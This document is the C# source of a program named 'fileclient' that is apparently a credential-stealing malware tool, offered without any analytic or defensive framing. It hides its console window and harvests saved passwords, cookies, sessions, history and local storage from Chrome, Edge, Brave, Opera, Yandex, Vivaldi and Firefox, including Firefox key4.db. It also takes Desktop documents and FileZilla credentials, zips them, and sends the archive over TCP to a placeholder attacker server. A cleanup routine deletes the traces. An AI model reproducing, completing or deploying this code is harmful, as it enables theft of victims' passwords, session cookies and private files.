using Ionic.Zip;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;


namespace fileclient
{
    internal class Program
    {

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        const int MAX_FILE_SIZE = 10 * 1024 * 1024;
        static string temp = Path.GetTempPath();
        static string LocalAppData = Environment.GetEnvironmentVariable("LocalAppData");
        static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        static string username = WindowsIdentity.GetCurrent().Name;
        static string workdir = Path.Combine(temp, username);
        static string host = Dns.GetHostName();
        
        
        static string HWID = Environment.MachineName;
        static async Task Main(string[] args)
        {
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
            string browsersDir = Path.Combine(workdir, "Browsers");
            string cookiesDir = Path.Combine(browsersDir, "Cookies");
            string profilesDir = Path.Combine(browsersDir, "Profiles");
            string sessionsDir = Path.Combine(browsersDir, "Sessions");

            Directory.CreateDirectory(browsersDir);
            Directory.CreateDirectory(cookiesDir);
            Directory.CreateDirectory(profilesDir);
            Directory.CreateDirectory(sessionsDir);
            
            CollectBrowserData(cookiesDir, profilesDir, sessionsDir);

            
            CollectDesktopFiles();

            
            CollectFileZillaData();

            string zipPath = Path.Combine(temp, username + "grab.zip");
            using (ZipFile zip = new ZipFile(Encoding.GetEncoding(866)))
            {
                zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                zip.AddDirectory(workdir);
                zip.Save(zipPath);
            }
          
            await SendFileAsync(zipPath, "SERVER_IP", 5555); // set server ip and port
            
        }
        static async Task SendFileAsync(string zipPath, string ip , int port)
        {
            using TcpClient client = new TcpClient();
            await client.ConnectAsync(ip, port);
            using NetworkStream stream = client.GetStream();
            using FileStream file = File.OpenRead(zipPath);
            byte[] buffer = new byte[1024 * 1024];
            int bytesRead;
            long totalBytes = 0;
            while ((bytesRead = await file.ReadAsync(buffer, 0, buffer.Length)) > 0)
            {
                await stream.WriteAsync(buffer, 0, bytesRead);
                totalBytes += bytesRead;
                
            }
            await stream.FlushAsync();

        }
        static void CollectBrowserData(string cookiesDir, string profilesDir, string sessionsDir)
        {
            
            var browsers = new Dictionary<string, string[]>
            {
                { "Chrome", new string[] {
                    Path.Combine(LocalAppData, @"Google\Chrome\User Data"),
                    Path.Combine(LocalAppData, @"Google\Chrome\User Data\Default")
                }},
                { "Chrome Beta", new string[] {
                    Path.Combine(LocalAppData, @"Google\Chrome Beta\User Data"),
                    Path.Combine(LocalAppData, @"Google\Chrome Beta\User Data\Default")
                }},
                { "Yandex", new string[] {
                    Path.Combine(LocalAppData, @"Yandex\YandexBrowser\User Data"),
                    Path.Combine(LocalAppData, @"Yandex\YandexBrowser\User Data\Default")
                }},
                { "Opera", new string[] {
                    Path.Combine(AppData, @"Opera Software\Opera Stable"),
                    Path.Combine(AppData, @"Opera Software\Opera Stable")
                }},
                { "Opera GX", new string[] {
                    Path.Combine(AppData, @"Opera Software\Opera GX Stable"),
                    Path.Combine(AppData, @"Opera Software\Opera GX Stable")
                }},
                { "Brave", new string[] {
                    Path.Combine(LocalAppData, @"BraveSoftware\Brave-Browser\User Data"),
                    Path.Combine(LocalAppData, @"BraveSoftware\Brave-Browser\User Data\Default")
                }},
                { "Edge", new string[] {
                    Path.Combine(LocalAppData, @"Microsoft\Edge\User Data"),
                    Path.Combine(LocalAppData, @"Microsoft\Edge\User Data\Default")
                }},
                { "Vivaldi", new string[] {
                    Path.Combine(LocalAppData, @"Vivaldi\User Data"),
                    Path.Combine(LocalAppData, @"Vivaldi\User Data\Default")
                }},
                { "Firefox", new string[] {
                    Path.Combine(AppData, @"Mozilla\Firefox\Profiles"),
                    Path.Combine(AppData, @"Mozilla\Firefox\Profiles")
                }}
            };

            foreach (var browser in browsers)
            {
                string browserName = browser.Key;
                string userDataPath = browser.Value[0];
                string defaultPath = browser.Value[1];

                if (Directory.Exists(userDataPath))
                {
                    string browserOutDir = Path.Combine(profilesDir, browserName);
                    Directory.CreateDirectory(browserOutDir);

                    if (browserName == "Firefox")
                    {
                        CollectFirefoxData(userDataPath, browserOutDir, cookiesDir, sessionsDir);
                    }
                    else
                    {
                        CollectChromiumData(defaultPath, browserOutDir, cookiesDir, sessionsDir, browserName);

                        
                        string[] profiles = Directory.GetDirectories(userDataPath, "Profile*");
                        foreach (string profile in profiles)
                        {
                            string profileName = Path.GetFileName(profile);
                            string profileOutDir = Path.Combine(browserOutDir, profileName);
                            Directory.CreateDirectory(profileOutDir);
                            CollectChromiumData(profile, profileOutDir, cookiesDir, sessionsDir, browserName);
                        }
                    }
                }
            }
        }
        static void CollectChromiumData(string profilePath, string outputDir, string cookiesDir, string sessionsDir, string browserName)
        {
            try
            {
               
                string loginDataPath = Path.Combine(profilePath, "Login Data");
                if (File.Exists(loginDataPath))
                {
                    var passwords = Passwords.ReadPass(loginDataPath);
                    StringBuilder passText = new StringBuilder();
                    passText.AppendLine($"=== {browserName} Passwords ===");
                    passText.AppendLine();

                    foreach (var item in passwords)
                    {
                        if ((item.Item2.Length > 0) && (item.Item3.Length > 0))
                        {
                            passText.AppendLine("URL: " + item.Item1);
                            passText.AppendLine("Login: " + item.Item2);
                            passText.AppendLine("Password: " + item.Item3);
                            passText.AppendLine();
                        }
                    }

                    string passFile = Path.Combine(outputDir, "passwords.txt");
                    File.WriteAllText(passFile, passText.ToString(), Encoding.UTF8);

                    
                    string allPassFile = Path.Combine(workdir, "All_Passwords.txt");
                    File.AppendAllText(allPassFile, passText.ToString(), Encoding.UTF8);
                }

                
                string cookiesPath = Path.Combine(profilePath, "Cookies");
                if (File.Exists(cookiesPath))
                {
                    string cookiesDest = Path.Combine(cookiesDir, $"{browserName}_Cookies.db");
                    File.Copy(cookiesPath, cookiesDest, true);

                   
                    ExportCookiesToText(cookiesPath, Path.Combine(cookiesDir, $"{browserName}_cookies.txt"));
                }

               
                string[] sessionFiles = { "Current Session", "Current Tabs", "Last Session", "Last Tabs", "Session Storage" };
                foreach (string sessionFile in sessionFiles)
                {
                    string sessionPath = Path.Combine(profilePath, sessionFile);
                    if (File.Exists(sessionPath))
                    {
                        string sessionDest = Path.Combine(sessionsDir, $"{browserName}_{sessionFile}");
                        File.Copy(sessionPath, sessionDest, true);
                    }
                }

                
                string[] csvExtensions = { "*.csv", "*.json", "*.xml" };
                foreach (string ext in csvExtensions)
                {
                    string[] csvFiles = Directory.GetFiles(profilePath, ext, SearchOption.AllDirectories);
                    foreach (string csvFile in csvFiles)
                    {
                        try
                        {
                            string relativePath = csvFile.Replace(profilePath, "");
                            string destFile = Path.Combine(outputDir, "Exported_Data", relativePath.TrimStart('\\'));
                            Directory.CreateDirectory(Path.GetDirectoryName(destFile));
                            File.Copy(csvFile, destFile, true);
                        }
                        catch { }
                    }
                }

               
                string localStoragePath = Path.Combine(profilePath, "Local Storage");
                if (Directory.Exists(localStoragePath))
                {
                    string localStorageDest = Path.Combine(outputDir, "LocalStorage");
                    CopyDirectory(localStoragePath, localStorageDest);
                }

                string extensionsPath = Path.Combine(profilePath, "Extensions");
                if (Directory.Exists(extensionsPath))
                {
                    string extensionsDest = Path.Combine(outputDir, "Extensions");
                    CopyDirectory(extensionsPath, extensionsDest);
                }

                
                string historyPath = Path.Combine(profilePath, "History");
                if (File.Exists(historyPath))
                {
                    string historyDest = Path.Combine(outputDir, "History.db");
                    File.Copy(historyPath, historyDest, true);
                }

                
                string bookmarksPath = Path.Combine(profilePath, "Bookmarks");
                if (File.Exists(bookmarksPath))
                {
                    string bookmarksDest = Path.Combine(outputDir, "Bookmarks.json");
                    File.Copy(bookmarksPath, bookmarksDest, true);
                }

              
                string webDataPath = Path.Combine(profilePath, "Web Data");
                if (File.Exists(webDataPath))
                {
                    string webDataDest = Path.Combine(outputDir, "WebData.db");
                    File.Copy(webDataPath, webDataDest, true);
                }
            }
            catch (Exception ex)
            {
                
                string errorLog = Path.Combine(workdir, "errors.txt");
                File.AppendAllText(errorLog, $"{browserName}: {ex.Message}\r\n");
            }
        }
        static void CollectFirefoxData(string profilesPath, string outputDir, string cookiesDir, string sessionsDir)
        {
            try
            {
                string[] profiles = Directory.GetDirectories(profilesPath, "*.default*");
                foreach (string profile in profiles)
                {
                    string profileName = Path.GetFileName(profile);
                    string profileOutDir = Path.Combine(outputDir, profileName);
                    Directory.CreateDirectory(profileOutDir);

                   
                    string cookiesFile = Path.Combine(profile, "cookies.sqlite");
                    if (File.Exists(cookiesFile))
                    {
                        File.Copy(cookiesFile, Path.Combine(cookiesDir, $"Firefox_{profileName}_cookies.sqlite"), true);
                        ExportFirefoxCookiesToText(cookiesFile, Path.Combine(cookiesDir, $"Firefox_{profileName}_cookies.txt"));
                    }

                   
                    string sessionFile = Path.Combine(profile, "sessionstore.jsonlz4");
                    if (File.Exists(sessionFile))
                    {
                        File.Copy(sessionFile, Path.Combine(sessionsDir, $"Firefox_{profileName}_sessionstore.jsonlz4"), true);
                    }

                    
                    string loginsFile = Path.Combine(profile, "logins.json");
                    if (File.Exists(loginsFile))
                    {
                        File.Copy(loginsFile, Path.Combine(profileOutDir, "logins.json"), true);
                    }

                    
                    string keyFile = Path.Combine(profile, "key4.db");
                    if (File.Exists(keyFile))
                    {
                        File.Copy(keyFile, Path.Combine(profileOutDir, "key4.db"), true);
                    }

                   
                    string profileBackup = Path.Combine(outputDir, "FullProfile_" + profileName);
                    CopyDirectory(profile, profileBackup);
                }
            }
            catch { }
        }
        static void ExportCookiesToText(string cookiesDbPath, string outputTxtPath)
        {
            try
            {
                
                var connectionString = "Data Source=" + cookiesDbPath + ";pooling=false";
                using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
                {
                    conn.Open();
                    string query = "SELECT host_key, name, value, path, expires_utc, is_secure FROM cookies";
                    using (var cmd = new System.Data.SQLite.SQLiteCommand(query, conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        StringBuilder sb = new StringBuilder();
                        sb.AppendLine("=== COOKIES EXPORT ===");
                        sb.AppendLine();

                        while (reader.Read())
                        {
                            sb.AppendLine($"Host: {reader["host_key"]}");
                            sb.AppendLine($"Name: {reader["name"]}");
                            sb.AppendLine($"Value: {reader["value"]}");
                            sb.AppendLine($"Path: {reader["path"]}");
                            sb.AppendLine($"Secure: {reader["is_secure"]}");
                            sb.AppendLine("---");
                        }

                        File.WriteAllText(outputTxtPath, sb.ToString(), Encoding.UTF8);
                    }
                }
            }
            catch { }
        }
        static void ExportFirefoxCookiesToText(string cookiesDbPath, string outputTxtPath)
        {
            try
            {
                var connectionString = "Data Source=" + cookiesDbPath + ";pooling=false";
                using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
                {
                    conn.Open();
                    string query = "SELECT host, name, value, path, isSecure FROM moz_cookies";
                    using (var cmd = new System.Data.SQLite.SQLiteCommand(query, conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        StringBuilder sb = new StringBuilder();
                        sb.AppendLine("=== FIREFOX COOKIES EXPORT ===");
                        sb.AppendLine();

                        while (reader.Read())
                        {
                            sb.AppendLine($"Host: {reader["host"]}");
                            sb.AppendLine($"Name: {reader["name"]}");
                            sb.AppendLine($"Value: {reader["value"]}");
                            sb.AppendLine($"Path: {reader["path"]}");
                            sb.AppendLine($"Secure: {reader["isSecure"]}");
                            sb.AppendLine("---");
                        }

                        File.WriteAllText(outputTxtPath, sb.ToString(), Encoding.UTF8);
                    }
                }
            }
            catch { }
        }
        static void CollectDesktopFiles()
        {
            try
            {
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string[] files = Directory.GetFiles(desktop);

                List<string> listFiles = new List<string>();
                string[] extensions = { ".pdf", ".txt", ".sql", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".json", ".xml", ".conf", ".config", ".ini" };

                foreach (string i in files)
                {
                    string extens = Path.GetExtension(i).ToLower();
                    foreach (string ext in extensions)
                    {
                        if (extens == ext)
                        {
                            listFiles.Add(i);
                            break;
                        }
                    }
                }

                if (listFiles.Count > 0)
                {
                    string desktopDir = Path.Combine(workdir, "Desktop");
                    Directory.CreateDirectory(desktopDir);

                    foreach (string i in listFiles)
                    {
                        string fileName = Path.GetFileName(i);
                        string destPath = Path.Combine(desktopDir, fileName);
                        if (File.Exists(destPath))
                            File.Delete(destPath);
                        File.Copy(i, destPath);
                    }
                }
            }
            catch { }
        }

        static void CollectFileZillaData()
        {
            try
            {
                string fileZillaPath = Path.Combine(AppData, "FileZilla");
                if (Directory.Exists(fileZillaPath))
                {
                    string filezillaDir = Path.Combine(workdir, "FileZilla");
                    Directory.CreateDirectory(filezillaDir);

                    DirectoryInfo dirInfo = new DirectoryInfo(fileZillaPath);
                    foreach (FileInfo file in dirInfo.GetFiles("*.xml"))
                    {
                        File.Copy(file.FullName, Path.Combine(filezillaDir, file.Name), true);
                    }
                }
            }
            catch { }
        }

        static void CopyDirectory(string sourceDir, string destDir)
        {
            try
            {
                if (!Directory.Exists(destDir))
                    Directory.CreateDirectory(destDir);

                foreach (string file in Directory.GetFiles(sourceDir))
                {
                    string destFile = Path.Combine(destDir, Path.GetFileName(file));
                    File.Copy(file, destFile, true);
                }

                foreach (string subDir in Directory.GetDirectories(sourceDir))
                {
                    string destSubDir = Path.Combine(destDir, Path.GetFileName(subDir));
                    CopyDirectory(subDir, destSubDir);
                }
            }
            catch { }
        }

        private static void UploadMultipart(byte[] fileData, string filename, string contentType, string url)
        {
            try
            {
                WebClient webClient = new WebClient();
                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);

                string header = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n", boundary, filename, contentType);
                string footer = "\r\n--" + boundary + "--\r\n";

                byte[] headerBytes = Encoding.UTF8.GetBytes(header);
                byte[] footerBytes = Encoding.UTF8.GetBytes(footer);

                byte[] result = new byte[headerBytes.Length + fileData.Length + footerBytes.Length];
                Buffer.BlockCopy(headerBytes, 0, result, 0, headerBytes.Length);
                Buffer.BlockCopy(fileData, 0, result, headerBytes.Length, fileData.Length);
                Buffer.BlockCopy(footerBytes, 0, result, headerBytes.Length + fileData.Length, footerBytes.Length);

                webClient.UploadData(url, "POST", result);

                
                try
                {
                    if (Directory.Exists(workdir))
                        Directory.Delete(workdir, true);

                    string zipPath = Path.Combine(temp, username + "grab.zip");
                    if (File.Exists(zipPath))
                        File.Delete(zipPath);
                }
                catch { }

                Environment.Exit(0);
            }
            catch
            {
                Environment.Exit(1);

            }
        }
    }
}
